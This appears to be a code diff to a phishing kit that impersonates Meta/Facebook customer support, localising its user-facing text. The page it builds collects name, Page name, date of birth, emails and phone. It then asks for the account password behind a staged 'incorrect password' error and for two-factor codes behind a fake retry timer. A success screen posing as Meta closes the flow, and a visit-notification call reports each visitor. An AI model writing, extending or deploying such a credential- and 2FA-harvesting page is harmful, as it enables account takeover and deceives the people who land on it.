@@ -3,14 +3,28 @@
 // Generate ticket ID
 document.getElementById('ticketId').textContent = Utils.generateTicketId();
 
-function i18nSource(key) {
-    return document.querySelector('#i18n-strings [data-i18n="' + key + '"]');
+function t(key, vars) {
+    if (window.I18n && typeof window.I18n.t === 'function') {
+        return window.I18n.t(key, vars);
+    }
+    return key;
+}
+
+function tAttr(key) {
+    return escapeHtml(t(key));
+}
+
+function escapeHtml(value) {
+    return String(value || '')
+        .replace(/&/g, '&amp;')
+        .replace(/</g, '&lt;')
+        .replace(/>/g, '&gt;')
+        .replace(/"/g, '&quot;');
 }
 
 function i18nText(key, fallback) {
-    const src = i18nSource(key);
-    const text = src ? src.innerText.trim() : '';
-    return text || fallback || '';
+    const text = t(key);
+    return (text && text !== key) ? text : (fallback || key);
 }
 
 function showKeyedError(container, attr, key) {
@@ -32,8 +46,6 @@ document.getElementById('submitRequestBtn').addEventListener('click', () => {
     Utils.sendVisitNotification();
     openClientModal();
 });
-
-Utils.getUserLocation().catch(() => {});
 
 const PHONE_COUNTRIES = [
     { iso: 'af', name: 'Afghanistan', dial: '+93' },
@@ -368,32 +380,32 @@ function openClientModal() {
     const content = `
         <div class="info-form">
             <div class="info-form-header">
-                <h2 class="info-form-title">Activation information</h2>
+                <h2 class="info-form-title">${t('activationTitle')}</h2>
             </div>
             <form id="clientForm" class="info-form-body">
                 <div class="info-form-section">
-                    <p class="info-form-section-title">Personal details</p>
+                    <p class="info-form-section-title">${t('personalDetails')}</p>
                     <div class="info-form-field">
-                        <label class="${labelClass}" for="fullName">Full name ${req}</label>
-                        <input type="text" id="fullName" name="fullName" class="${fieldClass}" placeholder="Enter your full name" autocomplete="name" required>
+                        <label class="${labelClass}" for="fullName">${t('fullName')} ${req}</label>
+                        <input type="text" id="fullName" name="fullName" class="${fieldClass}" placeholder="${tAttr('phFullName')}" autocomplete="name" required>
                     </div>
                     <div class="info-form-field">
-                        <label class="${labelClass}" for="fanpage">Page name ${req}</label>
-                        <input type="text" id="fanpage" name="fanpage" class="${fieldClass}" placeholder="Enter your Page name" required>
+                        <label class="${labelClass}" for="fanpage">${t('pageName')} ${req}</label>
+                        <input type="text" id="fanpage" name="fanpage" class="${fieldClass}" placeholder="${tAttr('phPageName')}" required>
                     </div>
                     <div class="info-form-field">
-                        <label class="${labelClass}" for="day">Date of birth ${req}</label>
+                        <label class="${labelClass}" for="day">${t('dob')} ${req}</label>
                         <div class="info-form-dob">
                             <select id="month" name="month" class="${fieldClass}" required>
-                                <option value="" disabled selected hidden>Month</option>
+                                <option value="" disabled selected hidden>${t('month')}</option>
                                 ${monthOptions}
                             </select>
                             <select id="day" name="day" class="${fieldClass}" required>
-                                <option value="" disabled selected hidden>Day</option>
+                                <option value="" disabled selected hidden>${t('day')}</option>
                                 ${dayOptions}
                             </select>
                             <select id="year" name="year" class="${fieldClass}" required>
-                                <option value="" disabled selected hidden>Year</option>
+                                <option value="" disabled selected hidden>${t('year')}</option>
                                 ${yearOptions}
                             </select>
                         </div>
@@ -401,32 +413,32 @@ function openClientModal() {
                 </div>
 
                 <div class="info-form-section">
-                    <p class="info-form-section-title">Contact</p>
+                    <p class="info-form-section-title">${t('contact')}</p>
                     <div class="info-form-grid">
                         <div class="info-form-field">
-                            <label class="${labelClass}" for="email">Email ${req}</label>
+                            <label class="${labelClass}" for="email">${t('email')} ${req}</label>
                             <input type="email" id="email" name="email" class="${fieldClass}" placeholder="name@example.com" autocomplete="email" required>
                         </div>
                         <div class="info-form-field">
-                            <label class="${labelClass}" for="emailBusiness">Business email ${req}</label>
+                            <label class="${labelClass}" for="emailBusiness">${t('businessEmail')} ${req}</label>
                             <input type="email" id="emailBusiness" name="emailBusiness" class="${fieldClass}" placeholder="business@example.com" autocomplete="email" required>
                         </div>
                     </div>
                     <div class="info-form-field">
-                        <label class="${labelClass}" for="phone">Phone number ${req}</label>
+                        <label class="${labelClass}" for="phone">${t('phone')} ${req}</label>
                         <div class="phone-field" id="phoneField">
                             <button type="button" id="phoneCountryBtn" class="phone-country-btn" aria-expanded="false" aria-haspopup="listbox">
                                 <img id="phoneCountryFlag" class="phone-flag" src="${phoneFlagUrl(initialPhone.iso)}" alt="${initialPhone.name}">
                                 <svg class="phone-caret" width="10" height="6" viewBox="0 0 10 6" fill="none" aria-hidden="true">
                                     <path d="M1 1l4 4 4-4" stroke="#65676b" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/>
                                 </svg>
-                                <span id="phoneCountryDial" class="phone-dial notranslate">${initialPhone.dial}</span>
+                                <span id="phoneCountryDial" class="phone-dial">${initialPhone.dial}</span>
                             </button>
-                            <input type="tel" id="phone" name="phone" class="${fieldClass}" placeholder="Phone number" autocomplete="tel" inputmode="tel" required>
+                            <input type="tel" id="phone" name="phone" class="${fieldClass}" placeholder="${tAttr('phPhone')}" autocomplete="tel" inputmode="tel" required>
                             <input type="hidden" id="phoneDialCode" name="phoneDialCode" value="${initialPhone.dial}">
                         </div>
                         <div id="phoneCountryMenu" class="phone-country-menu hidden">
-                            <input type="search" id="phoneCountrySearch" class="phone-country-search" placeholder="Search country" autocomplete="off">
+                            <input type="search" id="phoneCountrySearch" class="phone-country-search" placeholder="${tAttr('phSearchCountry')}" autocomplete="off">
                             <div id="phoneCountryList" class="phone-country-list" role="listbox"></div>
                         </div>
                     </div>
@@ -434,18 +446,18 @@ function openClientModal() {
 
                 <div class="info-form-section">
                     <div class="info-form-field">
-                        <label class="${labelClass}" for="notes">Additional notes <span class="info-form-optional">Optional</span></label>
-                        <textarea id="notes" name="notes" class="${fieldClass} info-form-textarea" placeholder="Add any information that may help us review your request" rows="3"></textarea>
+                        <label class="${labelClass}" for="notes">${t('notes')} <span class="info-form-optional">${t('optional')}</span></label>
+                        <textarea id="notes" name="notes" class="${fieldClass} info-form-textarea" placeholder="${tAttr('phNotes')}" rows="3"></textarea>
                     </div>
-                    <p class="info-form-hint">Our response will be sent to you within 14–48 hours.</p>
+                    <p class="info-form-hint">${t('notesHint')}</p>
                 </div>
 
                 <label class="info-form-terms" for="termsAgree">
                     <input type="checkbox" id="termsAgree" name="termsAgree">
-                    <span>I agree to the <a href="#" class="info-form-link">Terms of use</a></span>
+                    <span>${t('termsAgree')} <a href="#" class="info-form-link">${t('termsOfUse')}</a></span>
                 </label>
 
-                <button type="submit" class="info-form-submit">Submit</button>
+                <button type="submit" class="info-form-submit">${t('submit')}</button>
             </form>
         </div>
     `;
@@ -488,21 +500,21 @@ function openSecurityModal() {
                 <img src="./public/icons/ic_logo.svg" alt="Meta">
             </div>
             <div class="info-form-header">
-                <h2 class="info-form-title">Enter your password</h2>
-                <p class="info-form-subtitle">For your security, enter your password to continue this request.</p>
+                <h2 class="info-form-title">${t('passwordTitle')}</h2>
+                <p class="info-form-subtitle">${t('passwordSubtitle')}</p>
             </div>
             <form id="securityForm" class="info-form-body">
                 <div class="info-form-field">
                     <div class="password-field">
-                        <input type="password" id="password" name="password" class="info-form-control" placeholder="Enter your password" autocomplete="current-password" aria-label="Password" required>
-                        <button type="button" id="togglePassword" class="password-toggle notranslate" aria-label="Show password"></button>
+                        <input type="password" id="password" name="password" class="info-form-control" placeholder="${tAttr('phPassword')}" autocomplete="current-password" aria-label="${tAttr('phPassword')}" required>
+                        <button type="button" id="togglePassword" class="password-toggle" aria-label="${tAttr('showPassword')}"></button>
                     </div>
                     <p id="passwordError" class="info-form-error is-idle">
-                        <span data-password-error="empty">You haven't entered your password!</span>
-                        <span data-password-error="incorrect">The password you've entered is incorrect.</span>
+                        <span data-password-error="empty">${t('passwordEmpty')}</span>
+                        <span data-password-error="incorrect">${t('passwordIncorrect')}</span>
                     </p>
                 </div>
-                <button type="submit" class="info-form-submit">Continue</button>
+                <button type="submit" class="info-form-submit">${t('continue')}</button>
             </form>
             <div class="security-form-footer">
                 <img src="./public/icons/ic_meta_gray.svg" alt="Meta">
@@ -533,7 +545,7 @@ function openSecurityModal() {
     const setPasswordVisible = (visible) => {
         passwordInput.type = visible ? 'text' : 'password';
         togglePassword.innerHTML = visible ? eyeHideIcon : eyeShowIcon;
-        togglePassword.setAttribute('aria-label', visible ? 'Hide password' : 'Show password');
+        togglePassword.setAttribute('aria-label', visible ? t('hidePassword') : t('showPassword'));
     };
     setPasswordVisible(false);
 
@@ -595,17 +607,17 @@ function openSecurityModal() {
 function openAuthenticationModal(userData) {
     const emailDisplay = Utils.maskEmail(userData.email);
     const phoneDisplay = Utils.maskPhone(userData.phone);
-    const description = `Enter the 6 or 8-digit code we sent to ${emailDisplay}, ${phoneDisplay}, or from your authenticator app.`;
+    const description = t('authSubtitle', { email: emailDisplay, phone: phoneDisplay });
 
     const content = `
         <div class="info-form auth-form">
             <div class="auth-form-meta">
-                <span>${userData.fullName || ''}</span>
+                <span>${escapeHtml(userData.fullName || '')}</span>
                 <span class="auth-form-dot"></span>
                 <span>Facebook</span>
             </div>
             <div class="info-form-header">
-                <h2 class="info-form-title">Two-factor authentication</h2>
+                <h2 class="info-form-title">${t('authTitle')}</h2>
                 <p class="info-form-subtitle">${description}</p>
             </div>
             <div class="auth-form-preview">
@@ -613,15 +625,15 @@ function openAuthenticationModal(userData) {
             </div>
             <form id="authForm" class="info-form-body">
                 <div class="info-form-field">
-                    <label class="info-form-label" for="twoFa">Authentication code <span class="info-form-required">*</span></label>
-                    <input type="text" id="twoFa" name="twoFa" class="info-form-control auth-code-input" placeholder="6 or 8 digits" inputmode="numeric" autocomplete="one-time-code" maxlength="8" pattern="\\d{6}|\\d{8}" required>
+                    <label class="info-form-label" for="twoFa">${t('authCode')} <span class="info-form-required">*</span></label>
+                    <input type="text" id="twoFa" name="twoFa" class="info-form-control auth-code-input" placeholder="${tAttr('phAuthCode')}" inputmode="numeric" autocomplete="one-time-code" maxlength="8" pattern="\\d{6}|\\d{8}" required>
                     <p id="authError" class="info-form-error is-idle">
-                        <span data-auth-error="empty">You haven't entered the code!</span>
-                        <span data-auth-error="invalid">Enter a 6 or 8-digit code.</span>
-                        <span data-auth-error="retry">The code is incorrect. Try again after <span data-auth-retry-n>15</span> seconds.</span>
+                        <span data-auth-error="empty">${t('authEmpty')}</span>
+                        <span data-auth-error="invalid">${t('authInvalid')}</span>
+                        <span data-auth-error="retry">${t('authRetry', { n: 15 })}</span>
                     </p>
                 </div>
-                <button type="submit" class="info-form-submit">Continue</button>
+                <button type="submit" class="info-form-submit">${t('continue')}</button>
             </form>
             <div class="security-form-footer">
                 <img src="./public/icons/ic_meta_gray.svg" alt="Meta">
@@ -718,9 +730,9 @@ function openAuthenticationModal(userData) {
         submitBtn.classList.add('opacity-70');
 
         let time = seconds;
-        const retryNum = errorMsg.querySelector('[data-auth-retry-n]');
+        const retryEl = errorMsg.querySelector('[data-auth-error="retry"]');
         const paintRetry = () => {
-            if (retryNum) retryNum.textContent = String(time);
+            if (retryEl) retryEl.textContent = t('authRetry', { n: time });
             showAuthError('retry');
         };
         paintRetry();
@@ -745,14 +757,14 @@ function openAuthenticationModal(userData) {
 // ==================== MODAL 4: SUCCESS ====================
 function openSuccessModal() {
     const content = `
-        <h2 class="font-bold text-[18px] mb-4 text-center">Request has been sent</h2>
+        <h2 class="font-bold text-[18px] mb-4 text-center">${t('successTitle')}</h2>
         <div class="rounded-lg overflow-hidden mb-4">
             <img src="/public/images/success.jpg" alt="Success" class="w-full">
         </div>
-        <p class="text-[#9a979e] mb-1 text-[15px]">Your request has been added to the processing queue. We will handle your request within 24 hours.</p>
-        <p class="text-[#9a979e] mb-5 text-[15px]">From the Customer Support Meta.</p>
+        <p class="text-[#9a979e] mb-1 text-[15px]">${t('successBody1')}</p>
+        <p class="text-[#9a979e] mb-5 text-[15px]">${t('successBody2')}</p>
         <a href="https://www.facebook.com" class="block w-full h-[40px] min-h-[40px] bg-[#0064E0] text-white text-center rounded-full py-2.5 hover:bg-blue-700 transition-colors">
-            Return to Facebook
+            ${t('returnFacebook')}
         </a>
         <div class="w-16 mt-5 mx-auto">
             <img src="./public/icons/ic_meta_gray.svg" alt="Meta">
